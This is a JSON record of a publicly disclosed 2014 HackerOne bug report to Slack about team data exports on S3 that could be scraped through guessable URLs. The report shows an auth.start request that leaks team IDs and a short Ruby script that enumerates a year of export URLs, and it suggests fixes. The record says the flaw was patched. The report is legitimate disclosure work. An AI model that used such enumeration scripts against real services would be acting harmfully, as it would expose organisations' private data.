{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2014-11-09T20:34:55.833Z", 
    "voters": [
        "eveeez", 
        "mygf", 
        "spetr0x", 
        "cryptosector"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 2746, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Data exports stored on S3 can be scraped easily", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2014-12-09T20:34:56.617Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2014-03-02T21:11:40.029Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-03-02T21:11:40.029Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "Thanks for your report. Unfortunately, this issue had already been submitted. Our bug bounty program only awards the first report of any individual issue.\n\nI'm keeping this issue open until a fix is deployed.", 
            "markdown_message": "<p>Thanks for your report. Unfortunately, this issue had already been submitted. Our bug bounty program only awards the first report of any individual issue.</p>\n\n<p>I&#39;m keeping this issue open until a fix is deployed.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 11263, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jobert", 
                "url": "/jobert"
            }, 
            "created_at": "2014-03-12T23:12:26.492Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-03-12T23:12:26.492Z", 
            "actor": {
                "username": "iamcal", 
                "url": "/iamcal", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/138/8791978ab70ce1b1e1b7a9c70e393fcd58ea85a0_medium.jpg?1393562983"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "message": "This issue was patched on 2014-03-02", 
            "markdown_message": "<p>This issue was patched on 2014-03-02</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 16204, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-03-12T23:12:31.132Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-03-12T23:12:31.132Z", 
            "actor": {
                "url": "/slack", 
                "profile": {
                    "name": "Slack"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
                }
            }, 
            "team_handle": "slack", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::NotEligibleForBounty", 
            "id": 16205, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-11-09T20:34:55.850Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-09T20:34:55.850Z", 
            "actor": {
                "username": "jobert", 
                "url": "/jobert", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "slack", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 157688, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-12-09T20:34:59.886Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-12-09T20:34:59.886Z", 
            "actor": {
                "url": "/slack", 
                "profile": {
                    "name": "Slack"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
                }
            }, 
            "team_handle": "slack", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 175119, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jobert", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jobert", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/002/15c798072d48f06507cde4b11352a3338ae973fc_small.png?1410255083"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 27, 
        "name": "Improper Authentication - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -125980065.20086789, 
    "disclosed_at": "2014-12-09T20:34:59.860Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/2746", 
    "created_at": "2014-03-02T20:57:39.781Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>The URLs that are used to download the exports can be guessed easily by an attacker. The location of the export file is based on a date, a team ID and a team name:</p>\n<pre class=\"highlight plaintext\"><code>http://s3-us-west-2.amazonaws.com/slack-files2/&lt;team_id&gt;/export/&lt;date&gt;/&lt;name&gt;%20Slack%20export%20&lt;date&gt;.zip\n</code></pre>\n<p>The information an attacker needs, is the team its name and ID (the date needs to be enumerated). The information can be obtained due to a minor issue in the API (authentication). The following steps can be used to reproduce the issue.</p>\n\n<h1 id=\"step-1-obtain-team-id-and-team-name\">Step 1: obtain team ID and team name</h1>\n\n<p>The team ID and team name can be obtained by abusing some minor information leakage in the <code>auth.start</code> API call. The following request and response give an example.</p>\n\n<p><strong>Request</strong></p>\n<pre class=\"highlight plaintext\"><code>POST /api/auth.start HTTP/1.1\n...\n\nemail=jobert@hackerone.com\n</code></pre>\n<p><strong>Response</strong></p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\n...\n\n{&quot;ok&quot;:true,&quot;email&quot;:&quot;jobert@hackerone.com&quot;,&quot;domain&quot;:&quot;hackerone.com&quot;,&quot;users&quot;:[{&quot;url&quot;:&quot;https:\\/\\/hackerone.slack.com\\/&quot;,&quot;team&quot;:&quot;HackerOne&quot;,&quot;user&quot;:&quot;jobert&quot;,&quot;team_id&quot;:&quot;T0254389F&quot;,&quot;user_id&quot;:&quot;U0254GYNR&quot;}],&quot;teams&quot;:[],&quot;create&quot;:&quot;https:\\/\\/slack.com\\/create?email=jobert%40hackerone.com&quot;}\n</code></pre>\n<p>As can be seen in the JSON response, it contains the team ID (<code>T0254389F</code>) and a name (<code>HackerOne</code>) we need for the download links.</p>\n\n<h1 id=\"step-2-scrape-s3\">Step 2: scrape S3</h1>\n\n<p>I wrote a rough PoC that scrapes S3 and shows the found exports (not something I&#39;d use, just something I wrote for demonstration purposes -- feel free to use the team ID and name I mentioned before to check it out). </p>\n<pre class=\"highlight ruby\"><code><span class=\"nb\">require</span> <span class=\"s1\">&#39;date&#39;</span>\n<span class=\"nb\">require</span> <span class=\"s1\">&#39;net/http&#39;</span>\n<span class=\"nb\">require</span> <span class=\"s1\">&#39;uri&#39;</span>\n\n<span class=\"n\">team_id</span> <span class=\"o\">=</span> <span class=\"no\">ARGV</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span>\n<span class=\"n\">team_name</span> <span class=\"o\">=</span> <span class=\"no\">ARGV</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">create_export_url</span><span class=\"p\">(</span><span class=\"n\">team_id</span><span class=\"p\">,</span> <span class=\"n\">team_name</span><span class=\"p\">,</span> <span class=\"n\">date</span><span class=\"p\">)</span>\n  <span class=\"n\">date_dir</span>  <span class=\"o\">=</span> <span class=\"n\">date</span><span class=\"p\">.</span><span class=\"nf\">strftime</span> <span class=\"s1\">&#39;%Y-%m-%d&#39;</span>\n  <span class=\"n\">date_file</span> <span class=\"o\">=</span> <span class=\"n\">date</span><span class=\"p\">.</span><span class=\"nf\">strftime</span><span class=\"p\">(</span><span class=\"s1\">&#39;%b %-d %Y&#39;</span><span class=\"p\">).</span><span class=\"nf\">gsub</span> <span class=\"s1\">&#39; &#39;</span><span class=\"p\">,</span> <span class=\"s1\">&#39;%20&#39;</span>\n\n  <span class=\"s2\">&quot;http://s3-us-west-2.amazonaws.com/slack-files2/</span><span class=\"si\">#{</span><span class=\"n\">team_id</span><span class=\"si\">}</span><span class=\"s2\">/&quot;</span><span class=\"p\">\\</span>\n  <span class=\"s2\">&quot;export/</span><span class=\"si\">#{</span><span class=\"n\">date_dir</span><span class=\"si\">}</span><span class=\"s2\">/</span><span class=\"si\">#{</span><span class=\"n\">team_name</span><span class=\"si\">}</span><span class=\"s2\">%20Slack%20export%20</span><span class=\"si\">#{</span><span class=\"n\">date_file</span><span class=\"si\">}</span><span class=\"s2\">.zip&quot;</span>\n<span class=\"k\">end</span>\n\n<span class=\"n\">date</span> <span class=\"o\">=</span> <span class=\"no\">Date</span><span class=\"p\">.</span><span class=\"nf\">parse</span> <span class=\"s1\">&#39;March 2nd, 2014&#39;</span>\n\n<span class=\"mi\">365</span><span class=\"p\">.</span><span class=\"nf\">times</span> <span class=\"k\">do</span>\n  <span class=\"n\">uri</span>      <span class=\"o\">=</span> <span class=\"no\">URI</span> <span class=\"n\">create_export_url</span><span class=\"p\">(</span><span class=\"n\">team_id</span><span class=\"p\">,</span> <span class=\"n\">team_name</span><span class=\"p\">,</span> <span class=\"n\">date</span><span class=\"p\">)</span>\n  <span class=\"n\">response</span> <span class=\"o\">=</span> <span class=\"no\">Net</span><span class=\"o\">::</span><span class=\"no\">HTTP</span><span class=\"p\">.</span><span class=\"nf\">get_response</span> <span class=\"n\">uri</span>\n\n  <span class=\"k\">if</span> <span class=\"n\">response</span><span class=\"p\">.</span><span class=\"nf\">is_a?</span> <span class=\"no\">Net</span><span class=\"o\">::</span><span class=\"no\">HTTPOK</span>\n    <span class=\"nb\">puts</span> <span class=\"s2\">&quot;FOUND AN EXPORT: </span><span class=\"si\">#{</span><span class=\"n\">uri</span><span class=\"si\">}</span><span class=\"s2\">&quot;</span>\n  <span class=\"k\">end</span>\n\n  <span class=\"n\">date</span> <span class=\"o\">-=</span> <span class=\"mi\">1</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>To avoid these kind of issues, you could generate a link that <a href=\"/redirect?signature=97d91aa1791bf830f918393eb20d545808e9db8e&amp;url=http%3A%2F%2Fcss-tricks.com%2Fsnippets%2Fphp%2Fgenerate-expiring-amazon-s3-link%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>expires within a certain amount</span><i class=\"icon-external-link\"></i></a> of time (let&#39;s say, <code>&lt;time-export-completed&gt;+30m</code>) or use random values in the filename if expiring is not an option (make sure you don&#39;t solely rely on &quot;public domain info&quot;).</p>\n", 
    "vulnerability_information": "The URLs that are used to download the exports can be guessed easily by an attacker. The location of the export file is based on a date, a team ID and a team name:\r\n\r\n```\r\nhttp://s3-us-west-2.amazonaws.com/slack-files2/<team_id>/export/<date>/<name>%20Slack%20export%20<date>.zip\r\n```\r\n\r\nThe information an attacker needs, is the team its name and ID (the date needs to be enumerated). The information can be obtained due to a minor issue in the API (authentication). The following steps can be used to reproduce the issue.\r\n\r\n#Step 1: obtain team ID and team name\r\nThe team ID and team name can be obtained by abusing some minor information leakage in the `auth.start` API call. The following request and response give an example.\r\n\r\n**Request**\r\n\r\n```\r\nPOST /api/auth.start HTTP/1.1\r\n...\r\n\r\nemail=jobert@hackerone.com\r\n```\r\n\r\n**Response**\r\n\r\n```\r\nHTTP/1.1 200 OK\r\n...\r\n\r\n{\"ok\":true,\"email\":\"jobert@hackerone.com\",\"domain\":\"hackerone.com\",\"users\":[{\"url\":\"https:\\/\\/hackerone.slack.com\\/\",\"team\":\"HackerOne\",\"user\":\"jobert\",\"team_id\":\"T0254389F\",\"user_id\":\"U0254GYNR\"}],\"teams\":[],\"create\":\"https:\\/\\/slack.com\\/create?email=jobert%40hackerone.com\"}\r\n```\r\n\r\nAs can be seen in the JSON response, it contains the team ID (`T0254389F`) and a name (`HackerOne`) we need for the download links.\r\n\r\n#Step 2: scrape S3\r\nI wrote a rough PoC that scrapes S3 and shows the found exports (not something I'd use, just something I wrote for demonstration purposes -- feel free to use the team ID and name I mentioned before to check it out). \r\n\r\n``` ruby\r\nrequire 'date'\r\nrequire 'net/http'\r\nrequire 'uri'\r\n\r\nteam_id = ARGV[0]\r\nteam_name = ARGV[1]\r\n\r\ndef create_export_url(team_id, team_name, date)\r\n  date_dir  = date.strftime '%Y-%m-%d'\r\n  date_file = date.strftime('%b %-d %Y').gsub ' ', '%20'\r\n\r\n  \"http://s3-us-west-2.amazonaws.com/slack-files2/#{team_id}/\"\\\r\n  \"export/#{date_dir}/#{team_name}%20Slack%20export%20#{date_file}.zip\"\r\nend\r\n\r\ndate = Date.parse 'March 2nd, 2014'\r\n\r\n365.times do\r\n  uri      = URI create_export_url(team_id, team_name, date)\r\n  response = Net::HTTP.get_response uri\r\n\r\n  if response.is_a? Net::HTTPOK\r\n    puts \"FOUND AN EXPORT: #{uri}\"\r\n  end\r\n\r\n  date -= 1\r\nend\r\n```\r\n\r\nTo avoid these kind of issues, you could generate a link that [expires within a certain amount](http://css-tricks.com/snippets/php/generate-expiring-amazon-s3-link/) of time (let's say, `<time-export-completed>+30m`) or use random values in the filename if expiring is not an option (make sure you don't solely rely on \"public domain info\").", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://slack.com", 
            "about": "All your team communication in one place, instantly searchable, and available wherever you go.", 
            "twitter_handle": "slackhq", 
            "name": "Slack"
        }, 
        "handle": "slack", 
        "url": "https://hackerone.com/slack", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/069/a44d7bfd843f514c723441a5a40daf5bac8e9e38_small.png?1449082084", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 69, 
        "default_currency": "usd"
    }, 
    "is_published": false
}